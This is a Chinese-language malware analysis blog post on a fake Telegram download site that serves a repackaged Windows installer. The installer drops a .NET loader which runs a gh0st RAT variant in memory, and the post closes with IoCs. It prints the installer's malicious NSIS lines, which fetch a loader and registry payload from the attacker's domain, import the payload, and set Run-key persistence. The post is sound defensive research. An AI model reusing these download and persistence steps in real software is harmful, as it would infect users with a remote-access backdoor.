---
title: 分析一個加料的 Telegram for Windows 中文版安裝程式
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2020-10-25 17:01:39
categories:
    - Research
thumbnailImage: thumb-min.jpg
coverImage: cover-min.jpg
keywords:
    - Telegram
    - Trojan
    - gh0st RAT
    - Malware
tags:
    - Telegram
    - Trojan
    - gh0st RAT
    - Malware
---
紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。
<!-- more -->

<!-- toc -->

---

最初的樣本來自 `http://telegram-vip[.]com`，一個中文版 Telegram 的介紹和下載網站。
{% image fancybox center p1.png "Figure 1. 假的中文版 Telegram 網站" %}

網站首頁就有各版本的下載連結，但其中首頁下載 `Telegram for Mac` 和 `Telegram for windows` 的連結都會是下載被加料過的 Windows 安裝程式（寫這篇文章的時候下載的檔案是 `tsetup.2.1.10.exe`）。點選 Android 或 iPhone 的版本會到另一個下載的頁面：
{% image fancybox center p2.png "Figure 2. 下載頁面" %}
這邊就有些不同了：
- iPhone 下載的連結會連回到正常的 Apple App Store `https://apps.apple.com/app/telegram-messenger/id686449807`
- Android 版本會到另一個連結下載檔案 `https://telegrcn.org/download/telegramCN_631.apk`
- Mac 版本會到另一個連結下載檔案 `https://telegrcn.org/download/tsetup.2.1.10.dmg`
- Windows 版本跟首頁下載的檔案一樣

接下來這篇文章會只針對 Windows 的版本敘述，這個假的網站在今年 9 月時就已經在 Twitter 上有相關的討論，Android 版本的 APK 也已知是假的 APP，我在快分析完了才查到這個資料 😢，再次學到教訓把頭埋進逆向之前還是要好好的把訊息蒐集跟調查做好。
{% raw %}
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Interesting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1<br>From: http://telegram-vip[.]com/telegram_setup.2.1.6.exe<br>Seems some Chinese speaker made malware, targeting Chinese people.<br>🤔<br>cc <a href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a href="https://t.co/5jAtnQCkjx">pic.twitter.com/5jAtnQCkjx</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1310508328041283584?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
{% endraw %}

不過雖然已經有討論串出現，但現在看到的版本已經來到了 `2.1.10`，這讓我好奇想要來比較一下跟九月時的 `2.1.6` 版本有了什麼變化。接下來會用我手上有的 `telegram_setup.2.1.10.exe` 跟我在 ANY.RUN 這個[分析](https://app.any.run/tasks/aeb405ec-3fea-475f-9050-5ad0a5cf1c61/)找到的 `telegram_setup.2.1.6.exe` 相關檔案來做比較。

## 重新打包加料過的安裝程式
|Filename|SHA256|
|-|-|
|telegram_setup.2.1.6.exe|1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8|
|telegram_setup.2.1.10.exe|35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba|

這兩個安裝程式都是用 NSIS ([nullsoft scriptable install system](https://nsis.sourceforge.io/Main_Page)) 打包的，可以利用 7-zip 直接解壓縮就能得到還原的安裝腳本 `[NSIS].nsi`。7-zip 在 `9.33` 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 `15.06` 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。

解開以後兩個版本的目錄結構如下：
```
2.1.6/
├── $PLUGINSDIR                        // NSIS 相關的檔案
│   ├── InstallOptions.dll
│   ├── ioSpecial.ini
│   ├── LangDLL.dll
│   ├── modern-wizard.bmp
│   └── TextReplace.dll
├── C                                  // 安裝過程中會直接複製到對應的位置的檔案
│   └── PerfLog
│       ├── AddInProcess.exe           // Backdoor (Loader)
│       └── AddInProcess.exe.config
├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本
├── ns.reg                             // Payload Registry File
├── Telegram.exe                       // Telegram Desktop 2.1.6.0
├── uninst.exe.nsis
└── Updater.exe
```
```
2.1.10/
├── $PLUGINSDIR                        // NSIS 相關的檔案
│   ├── InetLoad.dll
│   ├── InstallOptions.dll
│   ├── ioSpecial.ini
│   ├── LangDLL.dll
│   ├── modern-wizard.bmp
│   ├── System.dll
│   └── TextReplace.dll
├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本
├── Telegram.exe                       // Telegram Desktop 2.1.6.0
├── uninst.exe.nsis
└── Updater.exe
```

對比兩個版本可以很明顯的注意到 `2.1.10` 少了 `C:\PerfLog` 跟 `ns.reg` 關鍵的後門檔案，`2.1.6` 很直接的就把這些檔案一起打包，`2.1.10` 改變方式，利用 NSIS 腳本在安裝過程中才將這兩個檔案下載下來，這可以在 `[NSIS].nis` 腳本中看到，下面是從 `2.1.10` 的 `[NSIS].nsi` 腳本中節錄部份相關的指令：
```sh
# Download loader and registry file
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index2.php cnPath.exe
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index3.php ns.reg
```
```sh
# Replace 123456 to <ComputerName> from ns.reg then use regedit.exe to import
ReadRegStr $R1 HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName
TextReplace::_FindInFile /NOUNLOAD $INSTDIR\ns.reg 123456 /S=1
TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\ns.reg $INSTDIR\ns.reg 123456 $R1 "/S=1 /C=1 /AO=1"
Exec "regedit.exe /s $\"$INSTDIR\ns.reg$\""
```
```sh
# Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe
StrCpy $R0 $INSTDIR\cnPath.exe
StrCpy $R1 C:\PerfLog\AddInProcess.exe
System::Call "Kernel32::MoveFileA(t R0,t R1)"
```
```sh
# Setup service registry and run
WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe
ExecShell "" C:\PerfLog\AddInProcess.exe
```
基本上看完 NSIS 腳本就能了解它的感染手段跟持久化的方式。

## 載入器 AddInProcess.exe
知道安裝過程動的手腳以後，目標就很明確了，`AddInProcess.exe` 跟寫入的 Registry 資料。

|Filename|SHA256|
|-|-|
|AddInProcess.exe (2.1.6)|f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063|
|AddInProcess.exe (2.1.10)|379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811|

基本上兩個的函式內容並沒有不同，僅有 metadata 改變而已，File Version 從 `1.0.0.0` 變成 `1.3.0.0`。
{% image fancybox center p3.png "Figure 3. 兩者的檔案基本訊息" %}
{% image fancybox center p4.png "Figure 4. 相同的 .NET 函式結構" %}
{% image fancybox center p5.png "Figure 5. 相同的 Main 函式" %}

從 Figure 5. 的 Main 函式就可以知道，`AddInProcess.exe` 只是個載入器，真正的內容在安裝時匯入的 registry 資料裡，位在 `HKEY_CURRENT_USER\Software\<COMPUTERNAME>`裡面是 base64 編碼過的 DLL 和一個 ip 位址。

{% image fancybox center p6.png "Figure 6. Registry 的內容" %}

## Assembly.Load(Malware.dll)
藉助 .NET 的 `Assembly.Load` 函式可以動態載入另一個 .NET 的 DLL，也就是 registry 的內容，我們可以提取出來進一步分析。

|Filename|Compile Time|SHA256|
|-|-|-|
|ns.reg (2.1.6)|N/A|96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22|
|registry.bin (2.1.6)|2020-09-23T09:43:39|7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a|
|ns.reg (2.1.10)|N/A|d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a|
|registry.bin (2.1.10)|2020-09-28T18:16:01|e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef|

|PDB Path|
|-|
|D:\source\MyJob\反射dll\ConsoleApplication2\obj\Release\反射.pdb|

> 這兩個 ns.reg 都維持 "123456" 並未被修改成 computer name 前的狀態。

提取出來的 .NET DLL 擁有相同的函式。

{% image fancybox center p7.png "Figure 7. registry.bin 的函式" %}

其中僅有 Main 函式，和寫死在 `ClassBuff` 其中的 `dlldata` 有差異。

{% image fancybox center p8.png "Figure 8. registry.bin (2.1.6) 的 Main 函式" %}
{% image fancybox center p9.png "Figure 9. registry.bin (2.1.10) 的 Main 函式" %}

在 `2.1.6` 的版本中，C2 的 ip 位址是用 `Program.GetRegedit()` 從 registry 裡面讀出來的，不知道為什麼在 `2.1.10` 的版本中變成帶入寫死的 base64 字串 `MTU0LjIyMi4xMDMuNTg6Nzg3OA==` 到 `Program.StartWorkThread()`。

{% image fancybox center p10.png "Figure 10. registry.bin 的 StartWorkThread 函式" %}

`Program.StartWorkThread()` 負責將 C2 的 ip 位址和 port 準備好來接著啟動 `Program.MainThread()`。這裡比較特別的是這個函式有另一個預設的 C2 ip 位址，當函數被呼叫代入空字串時，便會使用這個 ip。綜合前面看到 `Main()` 函式裡有個迴圈，在等待 300 秒後便會呼叫 `Program.StartWorkThread("")`，這時便會使用這個 ip 位址。

{% image fancybox center p11.png "Figure 11. registry.bin 的 MainThread 函式" %}

`Program.MainThread()` 接著將包含 ip 位址的物件轉為 bytes 後，尋找 `ClassBuff().dlldata` 裡預設的 `255.255.255.255` 來覆蓋掉。最後使用 `DLLFromMemory` 這個 class 在記憶體中直接執行最終的 DLL，export function `Launch`。

## Hello gh0st RAT DLL

|Filename|Compile Time|SHA256|
|-|-|-|
|dlldata_2.1.6.bin|2020-09-23T06:17:16|e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0|
|dlldata_2.1.10.bin|2020-09-28T18:15:16|9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db|

|PDB Path|
|-|
|D:\source\MyJob\企业远程控制\Release\ServerDll.pdb|

> 這兩個 DLL 都維持 C2 ip 是 255.255.255.255，還沒被修改前寫死在 registry.bin 的原樣。

最後在記憶體中動態載入的 DLL 是 gh0st RAT 的變種，新舊版本兩者的相似度極高，功能上大致沒有差異。

{% image fancybox center p12.png "Figure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果" %}

關於 gh0st RAT 的已經有很多很詳細的報告跟原始碼可以閱讀，這邊就不細講最後的這個 DLL。比較值得提的是這個樣本傳送和接收 TCP 封包都有進行簡單的位元運算。

{% image fancybox center p13.png "Figure 13. 收到封包後的編碼動作" %}
{% image fancybox center p14.png "Figure 14. 送出封包前的編碼動作" %}

另外這個 gh0st RAT 變種的 magic header 僅有三個字： `203` (`\x32\x30\x33`)，編碼後是 `\xCD\xCF\xCE`，後面 4 個 bytes 一樣是封包的大小（Figure 15. 的橘色框 `\x0F\x03\x00\x00`），剩餘資料並未壓縮。

{% image fancybox center p15.png "Figure 15. 原始的封包特徵" %}

## 延伸調查
以上，關於惡意程式的部份已經瞭解的差不多了，接下來把目光放回到 C2 上面。

前面分析的過程中得到了這兩個 C2 位址：
- `154.222.103.58:7878`
  - 第一個 C2 ip，`2.1.6` 版本是從 registry 讀出來，到了 `2.1.10` 雖然 registry 裡仍然有一樣的 ip，但樣本內也同時寫死了一樣的 ip（參考 Figure 9.）
- `185.224.168.130:3563`
  - 第二個 C2 ip，等待五分鐘後才連線用的（參考 Figure 10.）

還有最初的假網站 `http://telegram-vip.com`， A record 是 `45.114.106.2`。通過 favicon hash 或 HTML body hash 可以找到總共有五個關聯的 ip 都部屬著一樣的假網站：
- `45.114.106.2`
- `45.114.106.3`
- `45.114.106.4`
- `45.114.106.5`
- `45.114.106.6`

相關的搜尋特徵：
https://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22
https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700

{% image fancybox center p16.png "Figure 16. Shodan 針對 favicon hash 的搜尋結果" %}

{% image fancybox center p17.png "Figure 17. Censys 針對 HTTP body hash 的搜尋結果" %}

其中 `45.114.106.3` 有一個 Domain Name `telegramsvip.com`，看了一下 whois 是 10/15 才建的
```
Domain Name: TELEGRAMSVIP.COM
Registry Domain ID: 2565966013_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2020-10-15T08:01:06Z
Creation Date: 2020-10-15T08:01:05Z
Registry Expiry Date: 2021-10-15T08:01:05Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrar Abuse Contact Email: abuse(|]godaddy.com
Registrar Abuse Contact Phone: 480-624-2505
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Name Server: NS35.DOMAINCONTROL.COM
Name Server: NS36.DOMAINCONTROL.COM
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2020-10-25T15:39:21Z
```

甚至還打了 Google 廣告 XD
{% image fancybox center p18.jpg "Figure 18. Google 搜尋廣告" %}

相較原先的 `telegram-vip.com` 是在 09/21 就建立了，就在編譯後門的前兩天。
```
Domain Name: TELEGRAM-VIP.COM
Registry Domain ID: 2561073458_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2020-10-15T08:03:30Z
Creation Date: 2020-09-21T06:44:59Z
Registry Expiry Date: 2021-09-21T06:44:59Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrar Abuse Contact Email: abuse(aT}godaddy.com
Registrar Abuse Contact Phone: 480-624-2505
Domain Status: ok https://icann.org/epp#ok
Name Server: NS13.DOMAINCONTROL.COM
Name Server: NS14.DOMAINCONTROL.COM
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2020-10-25T15:40:38Z
```

## 小結
以上便是針對 Windows installer 的部份在分析過程中發現的一些有趣的內容，這個詐騙網站現在還在持續運作中，或許未來還能看到攻擊者對樣本有所更新，再觀察看看。~~（或是有空也來分析一下那個假的 APK）~~

## IoCs
|IP|Description|
|-|-|
|45.114.106.2|Fake Site|
|45.114.106.3|Fake Site|
|45.114.106.4|Fake Site|
|45.114.106.5|Fake Site|
|45.114.106.6|Fake Site|
|154.222.103.58|gh0st RAT C2|
|185.224.168.130|gh0st RAT C2|

|Domain|Creation Date|
|-|-|
|telegram-vip.com|2020-09-21T06:44:59Z|
|telegramsvip.com|2020-10-15T08:01:05Z|
|telegrcn.org|2020-05-19T02:31:56Z|


|SHA256|Description|
|-|-|
|1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8|telegram_setup.2.1.6.exe|
|35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba|tsetup.2.1.10.exe|
|f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063|AddInProcess.exe (telegram_setup.2.1.6.exe)|
|379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811|AddInProcess.exe (tsetup.2.1.10.exe)|
|96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22|ns.reg (2.1.6)|
|d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a|ns.reg (2.1.10)|
|7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a|excracted DLL from ns.reg (2.1.6)|
|e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef|extracted DLL from ns.reg (2.1.10)|
|e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0|embedded gh0st RAT DLL (2.1.6)|
|9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db|embedded gh0st RAT DLL (2.1.10)|
|19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17|telegramCN_631.apk|

|PDB Path|
|-|
|D:\source\MyJob\反射dll\ConsoleApplication2\obj\Release\反射.pdb|
|D:\source\MyJob\企业远程控制\Release\ServerDll.pdb|